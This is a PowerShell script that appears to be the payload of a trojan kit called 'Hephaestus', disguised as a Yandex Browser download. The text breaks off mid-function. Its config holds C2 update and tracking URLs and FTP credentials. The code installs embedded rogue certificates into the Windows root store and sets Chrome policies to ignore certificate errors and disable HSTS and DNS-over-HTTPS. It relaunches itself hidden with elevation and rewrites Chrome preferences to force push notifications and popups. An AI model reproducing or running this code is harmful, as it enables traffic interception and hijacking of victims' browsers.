
$xbody = "###head

$server = @'
{
  "urlDoc": "https://docs.google.com/document/d/1-SGgGsIP2tCGRTJkM-3TlKB6MSZ07Tx6SUymZcr1xfE/edit?tab=t.0#heading=h.on42emvo6578",
  "disabled": false,
  "disableVirus": false,
  "landingAuto": false,
  "landingName": "yandex-browser",
  "landingFtp": "ftp://j35248032_ftp:qF8sJxsm@babydolls.site/domains/yandex-browser.site/1/",
  "sourceCertDir": "C:\\soft\\hephaestus\\cert",
  "rootDir": "C:\\soft\\hephaestus",
  "cpDir": "C:\\soft\\hephaestus\\cp",
  "certDir": "C:\\soft\\hephaestus\\cert",
  "phpDir": "C:\\soft\\hephaestus\\php",
  "phpTemplateFile": "C:\\soft\\hephaestus\\php\\.\\dn.php",
  "phpTemplateSponsorFile": "C:\\soft\\hephaestus\\php\\.\\download.php",
  "htmlTemplateSponsorFile": "C:\\soft\\hephaestus\\php\\.\\download.html",
  "sysDir": "C:\\soft\\hephaestus\\sys",
  "troyanBuilder": "C:\\soft\\hephaestus\\troyanbuilder\\bin/debug/net7.0/TroyanBuilder.exe",
  "troyanDir": "C:\\soft\\hephaestus\\troyan",
  "troyanScriptDir": "C:\\soft\\hephaestus\\troyan\\troyanps",
  "troyanOutputDir": "C:\\soft\\hephaestus\\troyan\\.\\_output",
  "troyanExe": "C:\\soft\\hephaestus\\troyan\\.\\_output\\troyan.exe",
  "troyanIco": "C:\\soft\\hephaestus\\troyan\\.\\_output\\troyan.ico",
  "troyanVbsDir": "C:\\soft\\hephaestus\\troyan\\troyanvbs",
  "troyanVbsDebug": "C:\\soft\\hephaestus\\troyan\\.\\_output\\troyan.debug.vbs",
  "troyanVbsRelease": "C:\\soft\\hephaestus\\troyan\\.\\_output\\troyan.release.vbs",
  "body": "C:\\soft\\hephaestus\\troyan\\.\\_output\\body.txt",
  "bodyRelease": "C:\\soft\\hephaestus\\troyan\\.\\_output\\body.release.ps1",
  "bodyDebug": "C:\\soft\\hephaestus\\troyan\\.\\_output\\body.debug.ps1",
  "holder": "C:\\soft\\hephaestus\\troyan\\.\\_output\\holder.txt",
  "holderRelease": "C:\\soft\\hephaestus\\troyan\\.\\_output\\holder.release.ps1",
  "holderDebug": "C:\\soft\\hephaestus\\troyan\\.\\_output\\holder.debug.ps1",
  "userBody": "C:\\data\\185.247.141.125\\body.txt",
  "userTroyanExe": "C:\\data\\185.247.141.125\\troyan.exe",
  "userTroyanIco": "C:\\data\\185.247.141.125\\troyan.ico",
  "userDataDir": "C:\\data\\185.247.141.125",
  "userServerFile": "C:\\data\\185.247.141.125\\server.json",
  "userTroyanVbs": "C:\\data\\185.247.141.125\\troyan.vbs",
  "server": "185.247.141.125",
  "defaultIco": "C:\\soft\\hephaestus\\defaulticon.ico",
  "dnVbsLinkShort": "/default/sBN7uMzLJg/none/GetVbs",
  "dnVbsLink": "http://2.superhost.pw//default/s5I0FekrL5/none/GetVbs",
  "phpVbsLinkShort": "/default/GetVbsPhp",
  "userPhpVbsFile": "C:\\data\\185.247.141.125\\yandex-browser.php",
  "userSponsorPhpVbsFile": "C:\\data\\185.247.141.125\\yandex-browser-sponsor.php",
  "userSponsorHtmlVbsFile": "C:\\data\\185.247.141.125\\yandex-browser-sponsor.html",
  "userPhpExeFile": "C:\\data\\185.247.141.125\\yandex-browser-exe.php",
  "userSponsorPhpExeFile": "C:\\data\\185.247.141.125\\yandex-browser-sponsor-exe.php",
  "userSponsorHtmlExeFile": "C:\\data\\185.247.141.125\\yandex-browser-sponsor-exe.html",
  "downloadIdentifier": "yandex-browser",
  "updateUrl": "http://2.superhost.pw/update",
  "updateUrlFolder": "http://2.superhost.pw/data/",
  "updateUrlBlock": "http://2.superhost.pw/data/block/",
  "primaryDns": "127.0.0.1",
  "secondaryDns": "127.0.0.1",
  "track": true,
  "trackSerie": "test-new",
  "trackDesktop": false,
  "trackUrl": "http://2.superhost.pw/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "domainIps": [
    {
      "index": "2c129613-5084-4567-be7f-5465feb46af1",
      "name": "JS Ads",
      "ip": "127.0.0.1",
      "domains": [
        "mc.yandex.com",
        "mc.yandex.ru"
      ],
      "ftp": "ftp://ftp_JS_Ads:Abc12345!@127.0.0.1",
      "ftpAsHttp": "http://127.0.0.1/ftp",
      "enabled": true,
      "ads": "C:\\inetpub\\wwwroot\\ads\\JS_Ads"
    }
  ],
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": false,
  "startDownloads": [],
  "startUrlsForce": true,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "extractIconFromFront": true,
  "embeddingsForce": false,
  "embeddings": [],
  "extraUpdate": false,
  "_operate_isValid": false,
  "_operate_isAtWork": false,
  "_operate_hasToWork": false
}
'@ | ConvertFrom-Json


        $xdata = @{
        'mc.yandex.com'='MIIKkQIBAzCCCk0GCSqGSIb3DQEHAaCCCj4Eggo6MIIKNjCCBgcGCSqGSIb3DQEHAaCCBfgEggX0MIIF8DCCBewGCyqGSIb3DQEMCgECoIIE9jCCBPIwHAYKKoZIhvcNAQwBAzAOBAhYGQfvCI9Z1QICB9AEggTQYRdnCMpfpOnrdWmqrGZXM4605MnMDhH3WKRYydN9'+
'L5MSjx2LH8A8wbQtiUp46weN01d6dElo6jsQkl6PumIMph/g8CILoKv06iqkev6tAmc4o3s3p1mv6rL1G5SJaG52aluQfzPbFxwdsPKt798QFEz0xrj2iiD9CAl/eYL5r8p0Sa+40AH4Znu+sAx5JlELxO0Nd1Jaqj73NwwJL3LNO6+BiwNcACQa0ZEFeIRmvrLeRLlv'+
'lp112e/1apnAVe/wMsv/zetGixdGF8VaMIgF41WvdWFIH95kd6gbhguqgRB383il6VuBNLpLjORpEn3jcqlKl3GZpGP3e3UuX6vMGtcjslYwheBp4v4kdnlXcesWhUtusNTst/pSpG54xdyqhtWxbKAslLwL56gaHEb+el21ALob/jsseYSCZmu79kltfA3UrK7+BMWj'+
'Ss8aJyXWDYxRIBnVGSS3AJvBT5FwNQ8RMxWxI6xHa7xXe993G0X0NfVsiOstEIC1dpOL+qSxQ9AV1151JJMi8DdXVkkAGDYi8E2riFzQxh8QwCdmBzJ9G9gCf4KoF+A2xbmJx+lDmPrHCzn9fPSc0Ablpm0pnPrlfojXysEq8DrYN+iDYWQ3wzUFTNY82FNNYpfrkvzp'+
'f0KDtLfW5ar8WLDsM7Zya+2R/QECZa/DKHNDt05kerJvHwoLjy77zgiMeKS1K6ZUuQq4Dn9aqMYzUSFTV30+Ei6sQx2/NzrvQ6we9VYWPaXMaRJ5aNFZHnJAZft0PNRv4UBlh+CfJXmsmxKXKIMT8WvAceMAvf7bjb4WvasqfELpZOui4YGWfp0buXgJJhZdvPCkD9Jr'+
'cPqYCpFqAo5TNkzqz9RYNQMdzb+1o6h1JUb1AjMbI6GC9ZLxWDD3ntth2ihHEn765bbx0Gt1R43fKDKxRkuiM2WwmSjiiT0YLS5nPo48ry3O+nRlA6v12hpb2/0s6SwKn3egxy9pZ2O1+V3VFHlfPs6NJOEI4OeH0OLLT0rDzZ5I0B2CCHGAn+PYvtL8cDq/WfCrLP7Q'+
'2+OnUMjjsWZBl79PYJQ/rYMLijO65RT0sbOM9t/zzSYUdDaMhviqXHmKDVtRW0FoMghsMaqI8BojsCHTpVjqixoOF/le6aZn19wHvO/t9OOH+vMnXnNIpQxmTC3YCP4WlU5K2Rgwu0cArJN0TW3/cHtHLXs75qoslkQO5NxMCZB/UVY5AxyDN6oQyEr4Uh28Zuz3ID/j'+
'5wgzXbK4tK5gAlEK5VsCcFFH4vn6qnLj+R7r+5d0ctlzGzESMs8z5Gy92y+Sn9Zf5MaIo2HorBpSeeZqGS6K4CZd8ucn14EKtEfG/2BNNuu1f2BPPlsK4sOWWAJHEHae+Joz68U+qlLhe8ZOirFAZxxW3N/ZPWHPF/C0BHwUedFiwrDeq0fgTj1E7XbxSo3K1r7FZYQw'+
'4+t/uRD08J/SW5gBNems9G3o2sX26TcfcmcxJIgfF9zCKDDC55LGTp4zEzqc9/Qw0T/RyOaFfisiaOxKpgpYxw4hvJVRW8fDsU47JZAoaqM/487hmvfGMvJ0c3v8FvJxuMNzzFnZ98AkoBwfotTJlEFCYZr9F9aMIKSq+AI4E4rBcC3gFh9146OLMg7AwgRQLEvnp9zS'+
'CHExgeIwDQYJKwYBBAGCNxECMQAwEwYJKoZIhvcNAQkVMQYEBAEAAAAwXQYJKoZIhvcNAQkUMVAeTgB0AGUALQA5ADgAYQBiADAAYQAxAGIALQBmADcANwAwAC0ANAA3ADEANAAtADkAYwBjAGUALQA0ADIANwAwADMAMQBlADAAYQA2ADEANTBdBgkrBgEEAYI3EQEx'+
'UB5OAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwB0AHIAbwBuAGcAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIEJwYJKoZIhvcNAQcGoIIEGDCCBBQCAQAwggQNBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAhkBcn4tYfWhwIC'+
'B9CAggPgdt3qeUhU21Vp4xyX5rgdDeAlDYCdd/iUI0utKD7VdSWd2mFd412dymukWBj/jcagB53krtLqcXHPkREpyFTARudk6AOdJqY/hh7LSUIB79YhdP8mvGhidmVf/KRszNFTu1MFHMOQ7EAl2qG8Djh+n51bpwgNbMwFEhS18LIgYgYKCV3VF57FZESDaYklm9WE'+
'6bwMNSSUbCVkcgvzFgI0OQDiR37MYL9+9uoP731cgkbJKOsiftA/ucjOj3gwrJAHP0yjbcLm97EF6oUS07OckLeEtqf75imN41KSjev/FURL4WwAbIOC93rP/GQ+Fu6krFjrdTPkCXNDgTojbYDMaW7xurTgcsdSWkLkez62r7ed9pUaQava0Gvv83ruSDiP2JTgq2WG'+
'r1jVmHMNTWOgk0Tm7a0R/9gTK8rVD7CKnYOXeIDlG/fAihbxg6K2eP4jp7ZdI2i0TYHr8s3eUaF3JPjOdlL0VLwwEFQP4+JajU8IldvmOfJpkoJfibsByUgygW05zVFmhwM28oxo7lSkBZfyWK5xqWWFp2cRu3bpQUnYP7a1fHm3bJjPaUmGMg23fawaHFdqDOiQJ/NX'+
'pOIRyDFBVLV6Jv6x5J/tHGpw+YFOriK3mtTZu58m4D+lSCkShQOGmgMZA0ra9/KT/pUVdU4/MohZns+EsjSWiacAP4+ScwcgsHw/kUcKbWvnULzdxuTAQGVG25vWMEf7oSeD7V2sFGAAZzowLqtABcOHKXfCxbQiyPcC3+pA8tCM5/Ch/VG5WV04ZZlq42IkjJ3p4d6+'+
'bNJiVzMqzPVPgOR+65PeZatNsOT31ccVZ4NDBuM4k4x/I4lc/jmQhzDlwIQ8Wi75E8Zv48rU36ipQKvLBxAQ9G1i4bmjbHdGIAajEfuXoZnArUXmaQUXJgmjlbgUPtpBGUuW5qm0Ju3HSYq5PzVTX7YUQndPxOoUJ6xqGWwUQnd2IVHLMgocZf5UohgsJdNKgQel9Gkv'+
'LaR+1imXBDl3zs8YAAWUrhSevftXU6jDZ+BTkkJkBFGyXSKgmD+aRGE+DZXXHl/9tguV+MNHfqUOvY+C28gx4mDHtEccERZ5y7fUFetBX8H8Z6rEkIJom+mOgLvA5ebbMZODqt4eDRcnhw8DDggVIA1Nj246qdDjzL/7+Na81AIf1th4U1bvGqdXt3PTjFeLl3h2pS72'+
'ibJUQBffrQSl0Qpte8UwwyZAJVbMq7WI58ckm4CCWLawRVRXm0XsQAxCT3T00BqTmXzWkX97c4CdfsoimuM4y2VBLvNSUpjwL9xrsYYwecG40/JrqkHy4JCOwAJXmXZ7S7gwOzAfMAcGBSsOAwIaBBS5l3fnXd7FX773aYd+28/EFvZaewQUOD6K9ZI/JilP4BCurRsn'+
'lM09/FMCAgfQ'
'mc.yandex.ru'='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'+
'Oj+kQLACAgfQ'
    }
        

        $xfront = @(
        
        )
        $xfront_name = @(
        
        )
        $xembed = @(
        
        )
        $xembed_name = @(
        
        )

function Get-ScriptPath {
    $scriptPaths = @(
        #$MyInvocation.MyCommand.Definition,
        $PSCommandPath,
        $MyInvocation.MyCommand.Path
    )
    
    foreach ($path in $scriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}
function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )

    #$standardBase64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    #$customBase64Chars   = "QWERTYUIOPLKJHGFDSAZXCVBNMasdfghjklqwertyuiopzxcvbnm9876543210+/"
    
    # $decodedBase64String = $inContent

    # # $decodedBase64String = $decodedBase64String -replace ([regex]::Escape($customBase64Chars)), {
    # #     param($match)
    # #     $standardBase64Chars[$customBase64Chars.IndexOf($match.Value)]
    #}

    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)
        [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
    }
    catch {
        Write-Error "Failed to decode the custom Base64 string: $_"
    }
}


function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$globalDebug = IsDebug;

function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'holder' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'body' + '.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function RunMe {
    param (
        [string]$script, 
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    try 
    {
        $scriptPath = $script
        
        $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
        
        $globalArgs = $global:args
        foreach ($globalArg in $globalArgs) {
            $local += "-Argument `"$globalArg`""
        }

        if (-not [string]::IsNullOrEmpty($argName)) {
            $local += $argName
            $local += $argValue

        }

        $argumentList = ""
        for ($i = 0; $i -lt $local.Count; $i += 2) {
            $arg = $local[$i]
            $value = if ($i + 1 -lt $local.Count) { $local[$i + 1] } else { "" }
            $argumentList += "$arg $value "
        }

        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }
    catch {
          writedbg "RunMe $_"
    }
}

function IsElevated
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}


function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    CustomDecode -inContent $contentString -outFile $outputFilePath

    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        writedbg "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        writedbg "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function do_cert {
    try 
    {
        foreach ($key in $xdata.Keys) {
            Cert-Work -contentString $xdata[$key]
        }
    }
    catch {
        writedbg "An error occurred (ConfigureCertificates): $_"
      }
}

function do_chrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    writedbg "Chrome configured"
}



function Compare-Arrays {
    param (
        [array]$Array1,
        [array]$Array2
    )

    # Sort both arrays and compare
    $array1Sorted = $Array1 | Sort-Object | Get-Unique
    $array2Sorted = $Array2 | Sort-Object | Get-Unique

    $jo1 = $array1Sorted -join ',' 
    
    $jo2 = $array2Sorted -join ','

    # Determine if the arrays are equal (order does not matter)
    if ($jo1 -eq $jo2 ) {
        return $true
    } else {
        return $false
    }
}


function HaveToPushes {
    $result = $false;
    $exists = @()
    $toset = @()
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $exists += PushDomain -pushUrl $siteUrl
            }
        }
    }

    foreach ($push in $server.pushes) {
        $toset += PushDomain -pushUrl $push
    }

     $result = -not(Compare-Arrays -Array1 $exists -Array2 $toset)
    
    return $result;
}


function PushDomain {
    param ($pushUrl)

    # Trim the input string before the first comma
    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()

    # Parse the URI
    $parsedUri = [System.Uri]::new($trimmedUrl)
    
    # Extract domain and port
    $domain = $parsedUri.Host
    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }

    # Construct the result URL
    $result = "https://" + $domain + ":" + "$port,*"
    
    return $result
}

function PushExists
{
    param ($pushUrl)
    foreach ($push in $server.pushes) 
    {
        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
        {
            return $true;
        }
    }
    return $false
}

function Remove-Pushes {
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            $keysToRemove = @()

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $permission = (PushExists -pushUrl $siteUrl)
            
                if ($permission -eq $false) {
                    $keysToRemove += $field.Name
                } else {
                    writedbg "$siteUrl hasn't been removed, it is a good site."
                }
            }

            foreach ($key in $keysToRemove) {
                $notificationSettings.PSObject.Properties.Remove($key)
            }

            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force

            writedbg "All selected push notification settings have been removed."
        } else {
            writedbg "No or unexpected notification settings found in Preferences file."
        }
    } else {
        writedbg "Preferences file not found at path: $preferencesPath"
    }
}

function Add-Pushes{
    foreach ($push in $server.pushes) {
        Add-Push -pushUrl $push -work $work
    }
}

function Add-Push {
    param (
        [string]$pushUrl
    )

    $pushDomain = PushDomain -pushUrl $pushUrl

    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (-not (Test-Path -Path $chromePreferencesPath)) {
        writedbg "Chrome preferences file not found at path: $chromePreferencesPath"
        exit
    }

    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json

    if (-not $preferencesContent.profile) {
        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values) {
        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.popups = 1
    }

    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
    }

    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force

    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
        $contentSettings = $preferencesContent.profile.content_settings.exceptions
        $settingsToUpdate = @(
            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
